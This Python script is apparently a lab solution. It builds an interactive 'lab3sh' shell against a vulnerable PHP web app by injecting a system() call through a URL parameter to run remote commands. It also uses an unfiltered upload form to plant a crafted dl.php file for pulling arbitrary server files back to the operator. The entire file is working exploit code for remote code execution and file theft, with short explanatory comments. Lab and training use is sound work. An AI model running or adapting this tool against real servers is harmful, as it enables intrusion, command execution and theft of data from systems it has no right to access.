import sys
import requests
from bs4 import BeautifulSoup
serverbaseurl = 'http://'+sys.argv[1] #construct server url from ip
try:								  #then test if a connection can be made, handling exceptions
	testconn = requests.get(serverbaseurl, timeout=30)
except requests.ConnectionError as e:
	print('There was a connection error, or the server is not running.\n')
except requests.Timeout as e:
	print('Connection Timed Out.\n')
codeexectarget = serverbaseurl + '/codeexec/example1.php?name=hacker%22.system(%27' 
#the url of the code injection exploit, to be appended to the base url of the server, left open for command input
targetcloseurl ='%27); $dummy=%22' #this is the closing part of the url so that the exploit can succesfully be passed without error
usrinput = ''
while(usrinput != 'quit'):
	usrinput = input('lab3sh> ')
	if(usrinput.startswith('upload')):
		functioncall, localfile, rmfile = usrinput.split()
		uploadtarget = serverbaseurl + '/upload/example1.php' #url of file upload exploit. It doesn't screen for file extensions or anything
		exploittarget = "cd /var/www/upload/images; cp " + localfile + " " + rmfile #this will construct a command that moves the remote terminal working directory to where uploaded files will be stored, and then copies the uploaded file to the path specified
		ufiles = {'image': open(localfile,'rb')}
		try:
			r = requests.post(uploadtarget, files = ufiles, timeout=30) #upload the file
		except requests.ConnectionError as e:
			print('There was a connection error, or the server is not running.\n')
		except requests.Timeout as e:
			print('Connection Timed Out.\n')
		try:
			commandconn = requests.get(codeexectarget+exploittarget+targetcloseurl, timeout=30) #execute the exploit, and copy the file to where it needs to go
		except requests.ConnectionError as e:
			print('There was a connection error, or the server is not running.\n')
		except requests.Timeout as e:
			print('Connection Timed Out.\n')
		print("   File uploaded succesfully.")
	elif(usrinput.startswith('download')):
		functioncall, rmfile, localfile = usrinput.split()
		exploittarget = "cd /var/www/upload/images; cp -v " + rmfile + " " + localfile #this works much like upload, except it will fetch the file from the path specified into the images folder which is reachable with HTTP requests
		try:
			commandconn = requests.get(codeexectarget+exploittarget+targetcloseurl, timeout=30) # copy the file, preparing it for download
		except requests.ConnectionError as e:
			print('There was a connection error, or the server is not running.\n')
		except requests.Timeout as e:
			print('Connection Timed Out.\n')
		uploadtarget = serverbaseurl + '/upload/example1.php'
		ufiles = {'image': open('dl.php','rb')} #setup uploading a specially crafted php file for downloading ANYTHING
		try:
			r = requests.post(uploadtarget, files = ufiles, timeout=30) #upload the file
		except requests.ConnectionError as e:
			print('There was a connection error, or the server is not running.\n')
		except requests.Timeout as e:
			print('Connection Timed Out.\n')
		downloadtarget = serverbaseurl + '/upload/images/dl.php?name='+localfile
		try:
			r = requests.get(downloadtarget) #get the file
		except requests.ConnectionError as e:
			print('There was a connection error, or the server is not running.\n')
		except requests.Timeout as e:
			print('Connection Timed Out.\n')
		from pathlib import Path #for consistent writing of files
		locf = Path(localfile)
		locf.write_bytes(r.content) #write it to file
		print('   File downloaded successfully.')
	elif(usrinput != 'quit'):
		try:
			commandconn = requests.get(codeexectarget+usrinput+targetcloseurl, timeout=30) #if the command is not upload or download, try to pass the input as remote command
		except requests.ConnectionError as e:
			print('There was a connection error, or the server is not running.\n')
		except requests.Timeout as e:
			print('Connection Timed Out.\n')
		soup = BeautifulSoup(commandconn.content, "html.parser") #take the response and take only the message body
		myout = soup.prettify().split('\n')						 #and then convert it to a string
		i = 49													 #through testing, all pages returned by the server begin the relevant output on this line
		while(i<len(myout)):
			if 'Hello hacker' in myout[i]:						 #so print everything until this line is reached, which is what would print if there is no output from the command passed. If the exploit causes no output, then nothing will be printed
				break
			else:
				print('   '+myout[i])
			i += 1
			
